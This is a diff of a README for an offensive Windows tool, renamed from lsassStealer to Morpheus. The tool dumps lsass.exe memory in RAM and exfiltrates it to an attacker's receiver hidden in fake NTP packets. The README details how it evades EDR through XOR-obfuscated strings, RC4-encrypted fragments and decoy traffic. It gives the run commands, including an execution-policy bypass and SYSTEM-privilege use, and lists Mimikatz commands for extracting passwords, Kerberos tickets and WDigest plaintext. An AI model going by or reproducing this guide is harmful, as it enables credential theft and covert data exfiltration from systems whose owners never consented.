@@ -1,131 +1,157 @@
 
-<h1 align="center"> Project lsassStealer </h1>
+<h1 align="center"> Project Morpheus </h1>
 
-## **🔍 Overview**
-`lsassStealer` is an tool designed to **dump the memory of the Windows process `lsass.exe`** and **exfiltrate** it using **UDP packets disguised as NTP requests**. Unlike traditional tools like **Mimikatz**, this tool performs all operations **in RAM**, avoiding detection by **Windows Defender, EDR, and forensic tools**.
+## Overview
 
- 
+Morpheus is a covert tool designed to dump the memory of the Windows process "lsass.exe" and exfiltrate it using stealthy network techniques. Unlike traditional tools such as Mimikatz, lsassStealer performs all operations entirely in RAM—minimizing disk artifacts—and leverages advanced network obfuscation methods to evade detection by Windows Defender, EDR, and forensic tools.
+
 The project consists of:
-- A **dumper** (`memdump.c`) to **extract LSASS memory in RAM**.
-- A **sender** that transmits the **compressed dump over UDP (NTP packets)**.
-- A **receiver** (`server.py`) that **reassembles the fragments** and **decompresses the memory dump**.
+- A dumper (`morpheus.c`) that extracts the target process's memory (`lsass.exe`) using Windows debugging APIs.
+- A sender that compresses, fragments, and then exfiltrates the memory dump over UDP using packets disguised as legitimate NTP requests.
+- A receiver (`server.py`) that reassembles the fragments, decompresses the dump, and writes it to a file for further analysis.
 
----
+## Features
 
-## **🛠 Features**
-### **🔹 Process Identification**
-- The **process name (`lsass.exe`) is obfuscated** in the source code using **XOR encoding** (`0x13` key) to **bypass static detection**.
-- **Windows APIs (`CreateToolhelp32Snapshot`)** are used to **enumerate processes and extract the PID** dynamically.
+### Process Identification & Obfuscation
 
-### **🔹 Memory Dumping**
-- Uses **MiniDumpWriteDump (from `DbgHelp.dll`)** to dump LSASS **directly into RAM**, **never touching the disk**.
-- A **memory-mapped file** acts as a temporary buffer to minimize detection.
+- **Obfuscated Target:**
+  The target process name ("lsass.exe") is obfuscated in the source code using XOR encoding (with key 0x13) to avoid static signature detection.
+- **Dynamic Enumeration:**
+  The tool uses Windows APIs (e.g., `CreateToolhelp32Snapshot`) to enumerate running processes, dynamically locating the target's PID at runtime.
 
-### **🔹 Compression (zlib)**
-- The **dump is compressed in-memory** using `zlib` before transmission.
-- This **reduces size** and makes the exfiltration **less detectable**.
+### Memory Dumping & Compression
 
-### **🔹 Exfiltration via Fake NTP Packets**
-- The **compressed dump is fragmented into small chunks** and sent via **UDP packets disguised as NTP traffic**.
-- The **"Transmit Timestamp" field** of the NTP packet is **hijacked** to store **payload fragments**.
+- **In-Memory Dumping:**
+  lsassStealer leverages the `MiniDumpWriteDump` function from `DbgHelp.dll` to dump the target's memory directly into RAM, avoiding any disk writes.
+- **In-Memory Compression:**
+  The memory dump is compressed using zlib. This not only reduces the total amount of data that needs to be exfiltrated but also helps disguise the data by reducing its signature.
 
-### **🔹 Receiver Script**
-- A **Python-based receiver** (`receiver.py`) **listens on UDP port 123 (NTP)**.
-- It **reassembles the fragmented dump**, **decompresses** it, and **writes it to a file**.
+### Covert Exfiltration via Fake NTP Packets
 
----
+- **NTP Packet Camouflage:**
+  The compressed dump is fragmented into small chunks (each fragment carrying 2 bytes of useful data) and transmitted via UDP packets that mimic NTP requests.
+- **Data Embedding:**
+  Each 48-byte NTP packet is manipulated to embed covert data in the "Transmit Timestamp" field:
+  - **Header Packet:**
+    The very first packet is unencrypted and includes:
+      - 4 bytes: Total number of fragments (big-endian)
+      - 4 bytes: Total compressed dump size (big-endian)
+  - **Data Packets:**
+    Subsequent packets carry:
+      - 4 bytes: Fragment sequence number (encrypted with RC4)
+      - 4 bytes: Data fragment (encrypted with RC4)
+- **RC4 Encryption:**
+  Every payload (both data and parity) is encrypted with a simple RC4 stream cipher using a predefined key. Additionally, a variable "skip" value is computed based on the sequence number to add further randomness to the keystream, ensuring that even if packets are intercepted, the hidden data remains obfuscated.
 
-## **📜 How NTP Packet Camouflage Works**
-### **🔹 Normal NTP Packet Structure**
-NTP (Network Time Protocol) packets typically contain **48 bytes**, with the last 8 bytes storing the **Transmit Timestamp**.
+### Enhanced Reliability with RFEC & Retransmission
+
+- **RFEC Using Reed-Solomon Coding:**
+  lsassStealer implements advanced Reed Forward Error Correction (RFEC) techniques by using the Reed-Solomon algorithm. The algorithm operates over GF(256) (Galois Field 256) using precomputed logarithm and exponentiation tables, based on the primitive polynomial 0x11d.
+  - A Vandermonde matrix is used to generate the parity symbols. For every block of data fragments (with a block size defined by a configurable parameter), an equal number of parity fragments is computed.
+  - These parity fragments, often referred to as RFEC or Reed-Solomon coding packets, allow the receiver to recover any missing data fragments even in the presence of packet loss.
+- **Feedback-Based Retransmission:**
+  A feedback mechanism over UDP is implemented to detect missing fragments. The sender listens on port 123 for feedback packets that specify the sequence numbers of fragments that were not successfully received, and then retransmits those fragments. This process repeats up to a configurable maximum number of retransmission cycles.
+- **Randomized Transmission & Decoy Packets:**
+  To further obfuscate exfiltration, the order of fragment transmission is randomized. Additionally, decoy NTP packets are sent intermittently to blend with legitimate traffic and mislead network monitoring systems.
+
+## How NTP Packet Camouflage Works
+
+### Standard NTP Packet Structure
+
+A standard NTP packet is 48 bytes long with the last 8 bytes dedicated to the Transmit Timestamp. lsassStealer repurposes this field for covert data transmission:
 
 ```
- 0                   1                   2                   3
- 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|LI | VN  |Mode |    Stratum     |     Poll      |  Precision   |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                          Root Delay                           |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                       Root Dispersion                         |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                     Reference Identifier                      |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                                                               |
-|                   Reference Timestamp (64 bits)               |
-|                                                               |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                                                               |
-|                   Originate Timestamp (64 bits)               |
-|                                                               |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                                                               |
-|                    Receive Timestamp (64 bits)                |
-|                                                               |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                                                               |
-|                    Transmit Timestamp (64 bits)               |    <------- Hijacked
-|                                                               |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+      0                   1                   2                   3
+      0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+     |LI | VN  |Mode |    Stratum     |     Poll      |  Precision   |
+     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+     |                          Root Delay                           |
+     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+     |                       Root Dispersion                         |
+     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+     |                     Reference Identifier                      |
+     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+     |                                                               |
+     |                   Reference Timestamp (64 bits)               |
+     |                                                               |
+     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+     |                                                               |
+     |                   Originate Timestamp (64 bits)               |
+     |                                                               |
+     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+     |                                                               |
+     |                    Receive Timestamp (64 bits)                |
+     |                                                               |
+     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+     |                                                               |
+     |                    Transmit Timestamp (64 bits)               |
+     |                                                               |
+     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ```
 
-### **🔹 How This Tool Abuses NTP**
-- Instead of sending a **valid NTP Transmit Timestamp**, we hijack this field and we **embed data** into it.
-- The **first packet** contains a **header**:
-  - **4 bytes** → `total number of fragments` (big-endian)
-  - **4 bytes** → `total compressed size` (big-endian)
-- Each **subsequent packet** contains:
-  - **4 bytes** → `fragment sequence number`
-  - **4 bytes** → `data fragment`
+### Data Embedding Details
 
-This **allows memory dump exfiltration under the guise of legitimate NTP traffic**.
+- **Header Packet:**
+  - 4 bytes: Total number of fragments
+  - 4 bytes: Total compressed dump size
+- **Data Packets:**
+  - 4 bytes: Fragment sequence number (encrypted with RC4)
+  - 4 bytes: Data fragment (encrypted with RC4)
+- **RFEC (Reed-Solomon) Packets:**
+  For each block of data fragments, an equal number of parity fragments is generated using the Reed-Solomon algorithm. These packets are marked with a special high-order bit in the sequence number to denote RFEC data.
 
----
+## Installation & Compilation
 
-## **🚀 Installation & Compilation**
-### **🔹 Windows (PowerShell)**
- -- If you have VSCode or another configured environment
- 1. Run the following command:
+### Windows (PowerShell)
+
+If you are using Visual Studio Code or another configured development environment:
+1. Open a PowerShell window and run:
    ```powershell
    Set-ExecutionPolicy Bypass -Scope Process -Force; ./run.ps1
    ```
+   This script compiles `memdump.c` while linking against the necessary libraries (`ws2_32.lib` and `DbgHelp.lib`).
 
----
+## Usage
 
-## **🎯 Usage**
-### **1️⃣ Run the Dumper (Attacker)**
-On **Windows**:
-```powershell
-.\memdump.exe
-```
+1. **Run the Dumper (Attacker)**
 
-You will be prompted to **enter the remote server IP and port** for exfiltration.
+   On Windows, run:
+   ```powershell
+   .\memdump.exe
+   ```
+   You will be prompted to enter the receiver’s IP address and port for exfiltration.
 
-### **2️⃣ Run the Receiver (Listener)**
-On the **attacker machine**, run:
-```bash
-python3 server.py
-```
-This will **listen on UDP port 123 (NTP)** and reconstruct the **exfiltrated dump**.
+   **Important:** The executable must be run with SYSTEM privileges to properly access `lsass.exe`'s memory.
 
----
+2. **Run the Receiver (Listener)**
 
-## **📌 Example Execution**
-### **🟢 Attacker (Dumper)**
-```
-[*] Enter server IP: 192.168.1.100
-[*] Enter server port: 123
+   On the attacker's machine, run:
+   ```bash
+   python3 server.py
+   ```
+   The Python receiver listens on UDP port 123 (NTP), reassembles the incoming fragments, decompresses the memory dump, and saves it as a file (typically named `dump_memory.bin`).
+
+## Example Execution
+
+### Attacker (Dumper)
+
+```plaintext
+[*] Enter receiver IP: 192.168.1.100
+[*] Enter receiver port: 123
+[+] Decoded target process: lsass.exe
 [+] Process lsass.exe found with PID 1234
 [+] Memory dump completed. Size: 16 MB.
 [+] Compression completed. Compressed size: 512 KB.
 [+] Header sent: 128 fragments, 512 KB total.
-[+] Packet 1/128 sent.
+[+] Data packet for fragment 1/128 sent.
 ...
 [+] Transmission completed.
 ```
 
-### **🟢 Receiver (Listener)**
-```
+### Receiver (Listener)
+
+```plaintext
 [INFO] Listening on 0.0.0.0:123 (global timeout: 30s)
 [INFO] Header received: 128 fragments, 512 KB compressed size.
 [INFO] Receiving packets...
@@ -134,41 +160,35 @@ This will **listen on UDP port 123 (NTP)** and reconstruct the **exfiltrated dum
 [INFO] Decompressing...
 [INFO] Dump saved as dump_memory.bin.
 ```
-### WARNING : The exe has to be launched with SYSTEM privileges otherwise there's big chance it will fail.
----
 
-## **🔍 Analyzing the Dump with Mimikatz**
+## Analyzing the Dump with Mimikatz
 
-Once you have obtained the memory dump file (`dump_memory.bin`), you can analyze it using **Mimikatz** to extract credentials and other sensitive information. Here are the steps and commands to do so:
+Once `dump_memory.bin` is obtained, use Mimikatz to extract sensitive information:
 
-1. **Download Mimikatz**: Ensure you have the latest version of Mimikatz from the official GitHub repository.
+- **Download Mimikatz:**
+  Get the latest version from the official GitHub repository: [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
 
-2. **Run Mimikatz**: Open a command prompt with administrative privileges and navigate to the directory containing Mimikatz.
+- **Run Mimikatz:**
+  Open a command prompt with administrative privileges and navigate to the Mimikatz directory.
 
-3. **Load the Memory Dump**: Use the following commands to load and analyze the memory dump:
+- **Load and Analyze the Memory Dump:**
+  ```shell
+  mimikatz # sekurlsa::minidump dump_memory.bin
+  mimikatz # sekurlsa::logonpasswords
+  ```
+  The first command loads the memory dump.
 
-   ```shell
-   mimikatz # sekurlsa::minidump dump_memory.bin
-   mimikatz # sekurlsa::logonpasswords
-   ```
+  The second command extracts and displays logon credentials.
 
-   - The first command loads the memory dump file.
-   - The second command extracts and displays logon passwords from the dump.
+- **Extract Additional Information:**
+  ```shell
+  mimikatz # sekurlsa::tickets
+  mimikatz # sekurlsa::wdigest
+  ```
+  `sekurlsa::tickets` extracts Kerberos tickets.
 
-4. **Extract Additional Information**: You can use other Mimikatz commands to extract more information, such as:
+  `sekurlsa::wdigest` retrieves plaintext credentials stored by WDigest.
 
-   ```shell
-   mimikatz # sekurlsa::tickets
-   mimikatz # sekurlsa::wdigest
-   ```
+## Legal Notice
 
-   - `sekurlsa::tickets`: Extracts Kerberos tickets.
-   - `sekurlsa::wdigest`: Extracts plaintext credentials stored by WDigest.
-
----
-
-## **⚠️ Legal Notice**
-🚨 **This tool is for EDUCATIONAL and AUTHORIZED TESTING ONLY.**
-Use this tool **only on systems you own or have explicit permission to test**.
-
----
+This tool is for EDUCATIONAL and AUTHORIZED TESTING ONLY. Use it only on systems you own or for which you have explicit permission to test. Unauthorized use is illegal and unethical.
